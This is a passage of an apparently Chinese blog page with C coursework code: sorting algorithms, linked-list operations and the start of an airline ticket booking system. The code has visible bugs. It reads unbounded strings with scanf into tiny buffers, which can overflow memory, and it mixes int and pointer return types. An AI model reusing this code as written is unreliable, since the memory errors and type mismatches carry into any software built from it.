class="function"><span class="keyword">int</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span> arr[])</span> </span>&#123;    <span class="comment">/*排序列表*/</span></span><br><span class="line">    <span class="keyword">int</span> M = <span class="number">1</span>, N = count, i, ch;<span class="comment">/*建立快速，归并排序所需数组*/</span></span><br><span class="line">    <span class="keyword">int</span> r1[N + <span class="number">1</span>], r2[N + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= N; i++) &#123;</span><br><span class="line">        r1[i - <span class="number">1</span>] = arr[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//system("CLS");</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"1.直接插入排序\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"2.冒泡排序\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"3.直接选择排序\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"4.快速排序\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"5.归并排序\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入你的选择："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;ch);</span><br><span class="line">    <span class="keyword">switch</span>(ch) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:insertSort(arr);<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:bubbleSort(arr);<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:selectionSort(arr);<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:quickSort(arr, M, N);<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:mergeSort(r1, r2, <span class="number">0</span>, N - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= N; i++) &#123;</span><br><span class="line">                arr[i] = r1[i - <span class="number">1</span>];</span><br><span class="line">        &#125;<span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">insertSort</span><span class="params">(<span class="keyword">int</span> arr[])</span> </span>&#123;    <span class="comment">/*直接插入排序*/</span></span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">2</span>; i &lt;= count; i++) &#123;</span><br><span class="line">        arr[<span class="number">0</span>] = arr[i];    <span class="comment">/*array[0]作为监督哨*/</span></span><br><span class="line">        j = i - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (arr[<span class="number">0</span>] &lt; arr[j]) &#123;    <span class="comment">/*从后向前找到第一个关键字不小于arr[0]的记录*/</span></span><br><span class="line">            arr[j + <span class="number">1</span>] = arr[j];</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">    arr[j + <span class="number">1</span>] = arr[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bubbleSort</span><span class="params">(<span class="keyword">int</span> arr[])</span> </span>&#123;    <span class="comment">/*冒泡排序*/</span></span><br><span class="line">    <span class="keyword">int</span> i, j, temp;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= count; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= count - i; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                temp = arr[j + <span class="number">1</span>];</span><br><span class="line">                arr[j + <span class="number">1</span>] = arr[j];</span><br><span class="line">                arr[j] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">selectionSort</span><span class="params">(<span class="keyword">int</span> arr[])</span> </span>&#123;    <span class="comment">/*直接选择排序*/</span></span><br><span class="line">    <span class="keyword">int</span> i, j, temp, m;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= count; i++) &#123;</span><br><span class="line">        m = i;</span><br><span class="line">        <span class="keyword">for</span> (j = i + <span class="number">1</span>; j &lt;= count; j++) &#123;    <span class="comment">/*找到最小的数字*/</span></span><br><span class="line">            <span class="keyword">if</span>(arr[j] &lt; arr[m]) &#123;</span><br><span class="line">                m = j;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span> (i != m) &#123;</span><br><span class="line">            temp = arr[i];</span><br><span class="line">            arr[i] = arr[m];</span><br><span class="line">            arr[m] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">quickSort</span><span class="params">(<span class="keyword">int</span> arr[], <span class="keyword">int</span> M, <span class="keyword">int</span> N)</span> </span>&#123;    <span class="comment">/*快速排序*/</span></span><br><span class="line">    <span class="keyword">int</span> i, j, x;</span><br><span class="line">    i = M, j = N;</span><br><span class="line">    x = arr[i];</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> ((arr[j] &gt;= x) &amp;&amp; (j &gt; i)) &#123;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; j) &#123;</span><br><span class="line">                arr[i] = arr[j];</span><br><span class="line">                i++;</span><br><span class="line">                <span class="keyword">while</span> (arr[j] &lt;= x &amp;&amp; (i &lt; j)) &#123;</span><br><span class="line">                    i++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (i &lt; j) &#123;</span><br><span class="line">                    arr[j] = arr[i];</span><br><span class="line">                    j--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;<span class="keyword">while</span> (i != j);</span><br><span class="line">    arr[i] = x;</span><br><span class="line">    i++;</span><br><span class="line">    j--;</span><br><span class="line">    <span class="keyword">if</span> (M &lt; j) &#123;</span><br><span class="line">        quickSort(arr, M ,j);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; N) &#123;</span><br><span class="line">        quickSort(arr, i, N);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span> r[], <span class="keyword">int</span> r2[], <span class="keyword">int</span> S, <span class="keyword">int</span> M, <span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,k,j;</span><br><span class="line">    i = S, k = S, j = M + <span class="number">1</span>;    <span class="comment">/*从S开始*/</span></span><br><span class="line">    <span class="keyword">while</span> ((i != M + <span class="number">1</span>) &amp;&amp; (j != N + <span class="number">1</span>)) &#123;    <span class="comment">/*当两个表都有内容未排完时*/</span></span><br><span class="line">        <span class="keyword">if</span> (r[i] &gt; r[j]) &#123;</span><br><span class="line">            r2[k] = r[j];</span><br><span class="line">            j++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            r2[k] = r [i];</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        k++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (i != M + <span class="number">1</span>) &#123;    <span class="comment">/*将剩下的全部放入*/</span></span><br><span class="line">        r2[k++] = r[i++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (j != N + <span class="number">1</span>) &#123;</span><br><span class="line">        r2[k++] = r[j++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = S; i &lt;= N; i++) &#123;</span><br><span class="line">        r[i] = r2[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mergeSort</span><span class="params">(<span class="keyword">int</span> r[], <span class="keyword">int</span> r2[], <span class="keyword">int</span> S, <span class="keyword">int</span> N)</span> </span>&#123;    <span class="comment">/*归并排序*/</span></span><br><span class="line">    <span class="keyword">int</span> M;</span><br><span class="line">    <span class="keyword">if</span> (S &lt; N) &#123;</span><br><span class="line">        M = (S + N)/<span class="number">2</span>;</span><br><span class="line">        mergeSort(r, r2, S, M);</span><br><span class="line">        mergeSort(r, r2, M + <span class="number">1</span>, N);</span><br><span class="line">        merge(r, r2, S, M, N);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">createNode</span><span class="params">(Node *L)</span> </span>&#123;    <span class="comment">/*建立链表*/</span></span><br><span class="line">    Node *q;</span><br><span class="line">    <span class="keyword">int</span> m, n, i;    <span class="comment">/*节点个数为m，节点数据为n*/</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入链表节点个数："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        q = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入第%d节点数据："</span>,i+<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">        q -&gt; data = n;</span><br><span class="line">        L -&gt; next = q;</span><br><span class="line">        L = q;</span><br><span class="line">    &#125;</span><br><span class="line">    L -&gt; next = <span class="literal">NULL</span>;    <span class="comment">/*尾标识为NULL*/</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sortNode</span><span class="params">(Node *L)</span> </span>&#123;    <span class="comment">/*对链表节点进行排序，仅交换数据*/</span></span><br><span class="line">    <span class="keyword">int</span> i, j, tempData;</span><br><span class="line">    Node *head, *point;    <span class="comment">/*辅助指针point帮助指向head的下一个节点*/</span></span><br><span class="line">    head = L;</span><br><span class="line">    head = head -&gt; next;</span><br><span class="line">    <span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (head -&gt; next != <span class="literal">NULL</span>) &#123;    <span class="comment">/*计算链表长度*/</span></span><br><span class="line">        head = head -&gt; next;</span><br><span class="line">        length++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++) &#123;    <span class="comment">/*冒泡排序*/</span></span><br><span class="line">        head = L;    <span class="comment">/*将head复位*/</span></span><br><span class="line">        head = head -&gt; next;</span><br><span class="line">        <span class="keyword">for</span>(j = i; j &lt; length; j++) &#123;</span><br><span class="line">            point = head -&gt; next;</span><br><span class="line">            <span class="keyword">if</span>(head -&gt; data &gt;= point -&gt; data) &#123;</span><br><span class="line">                tempData = head -&gt; data;</span><br><span class="line">                head -&gt; data = point -&gt; data;</span><br><span class="line">                point -&gt; data = tempData;</span><br><span class="line">            &#125;</span><br><span class="line">            head = head -&gt; next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    head = L;    <span class="comment">/*指针回到开头*/</span></span><br><span class="line">    head = head -&gt; next;</span><br><span class="line">    <span class="keyword">while</span> (head != <span class="literal">NULL</span>) &#123;    <span class="comment">/*将排序后的线性表显示出来*/</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>, head -&gt; data);</span><br><span class="line">        head = head -&gt; next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">combine</span><span class="params">(<span class="keyword">int</span> arr[], Node *L2)</span> </span>&#123;    <span class="comment">/*结合两张表*/</span></span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> i, j, temp;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= count; i++) &#123;</span><br><span class="line">        a[i - <span class="number">1</span>] = arr[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (L2 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        a[count] = L2 -&gt; data;</span><br><span class="line">        count++;</span><br><span class="line">        L2=L2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= count; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= count - i; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[j] &gt; a[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                temp = a[j + <span class="number">1</span>];</span><br><span class="line">                a[j + <span class="number">1</span>] = a[j];</span><br><span class="line">                a[j] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;count<span class="number">-1</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>, a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> choose;</span><br><span class="line">    Node *L2;</span><br><span class="line">    L2 = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"1.建立顺序表\n"</span>);</span><br><span class="line">        createList(<span class="built_in">array</span>);printList(<span class="built_in">array</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"2.顺序表排序\n"</span>);</span><br><span class="line">        sort(<span class="built_in">array</span>);printList(<span class="built_in">array</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"3.建立链表\n"</span>);</span><br><span class="line">        createNode(L2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"4.逆置链表\n"</span>);</span><br><span class="line">        sortNode(L2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"5.合并顺序表与链表\n"</span>);</span><br><span class="line">        combine(<span class="built_in">array</span>,L2);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="飞机票预订系统"><a href="#飞机票预订系统" class="headerlink" title="飞机票预订系统"></a>飞机票预订系统</h3><p>可在同一文件夹下创建Customer.txt文件存储信息。不过用来读取信息不能实现。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">customer</span> &#123;</span>    <span class="comment">/*乘客结构体*/</span></span><br><span class="line"><span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">int</span> seat;</span><br><span class="line"><span class="keyword">char</span> sex[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">char</span> goal[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">char</span> type[<span class="number">1</span>];</span><br><span class="line">&#125;Customer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">list</span> &#123;</span>    <span class="comment">/*将乘客规划为数组*/</span></span><br><span class="line">    Customer *<span class="built_in">array</span>[<span class="number">25</span>];     <span class="comment">/*最大存放25人*/</span></span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;sqList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span>    <span class="comment">/*将飞机规划为链表*/</span></span><br><span class="line">    <span class="keyword">int</span> number;</span><br><span class="line"><span class="keyword">int</span> input;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;Node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> temp1 = <span class="number">0</span>;    <span class="comment">/*航班计数器*/</span></span><br><span class="line"><span class="keyword">int</span> temp2 = <span class="number">0</span>;    <span class="comment">/*人数计数器*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">createPlane</span><span class="params">(Node *L)</span> </span>&#123;    <span class="comment">/*创建飞机链表*/</span></span><br><span class="line">    <span class="keyword">int</span> x, y;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入飞机序号(序号为0时输入完毕)："</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);</span><br><span class="line">        <span class="keyword">if</span> (x != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"请输入登机口："</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;y);</span><br><span class="line">            Node *q;    <span class="comment">/*定义新节点*/</span></span><br><span class="line">            q = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">            temp1++;</span><br><span class="line">            q -&gt; number = x;</span><br><span class="line">            q -&gt; input = y;</span><br><span class="line">            L -&gt; next = q;</span><br><span class="line">            L = q;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">while</span>(x != <span class="number">0</span>);    <span class="comment">/*飞机序号为0时结束*/</span></span><br><span class="line">    L -&gt; next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">deleteNode</span><span class="params">(Node *L)</span> </span>&#123;    <span class="comment">/*删除飞机节点*/</span></span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    Node *q;</span><br><span class="line">    q = L;</span><br><span class="line">    Node *r = q;</span><br><span class="line">    q = q -&gt; next;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入要删除的飞机序号（警告该飞机下的乘客全部删除！）："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;num);</span><br><span class="line">    <span class="keyword">while</span>(q != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (q -&gt; number == num) &#123;</span><br><span class="line">            r -&gt; next = q -&gt; next;</span><br><span class="line">            <span class="built_in">free</span>(q);</span><br><span class="line">            temp1--;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            q = q -&gt; next;</span><br><span class="line">            r = r -&gt; next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"未找到该飞机！"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">initSqList</span> <span class="params">(sqList *S)</span> </span>&#123;    <span class="comment">/*容器初始化*/</span></span><br><span class="line">    S -&gt; length = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">createSqList</span> <span class="params">(Node *L, sqList *S)</span> </span>&#123;   <span class="comment">/*构造乘客容器*/</span></span><br><span class="line">    <span class="keyword">int</span> x, y, i;</span><br><span class="line">    Node *q;</span><br><span class="line">    q = L;</span><br><span class="line">    q = q -&gt; next;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入乘客所在飞机号："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);</span><br><span class="line">    <span class="keyword">while</span> (q != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (q -&gt; number == x) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"该飞机共有几名乘客:"</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;y);</span><br><span class="line">            <span class="keyword">for</span> (i = temp2 + <span class="number">1</span>; i &lt;= y; i++) &#123;</span><br><span class="line">            S -&gt; <span class="built_in">array</span>[i] = createCustomer(i);</span><br><span class="line">            S -&gt; length ++;</span><br><span class="line">            temp2++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> S;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            q = q -&gt; next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"未找到该飞机序号！"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">createCustomer</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;    <span class="comment">/*创建新乘客*/</span></span><br><span class="line">    Customer *q;</span><br><span class="line">    q = (Customer*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Customer));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入乘客身份识别号："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;(q -&gt; id));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入乘客姓名："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;(q -&gt; name));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入座位号："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;(q -&gt; seat));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入乘客性别："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;(q-&gt; sex));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入目的地："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;(q -&gt; goal));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入舱位种类: "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;(q -&gt; type));</span><br><span class="line">    <span class="keyword">return</span> 